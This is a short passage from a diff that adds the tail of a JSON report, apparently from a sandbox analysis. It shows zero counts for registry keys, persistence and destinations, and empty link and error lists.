+          "registry_keys": 0,
+          "persistence": 0,
+          "destinations": 0
+        }
+      },
+      "links": []
+    }
+  ],
+  "errors": [],
+  "errors_truncated": false
+}
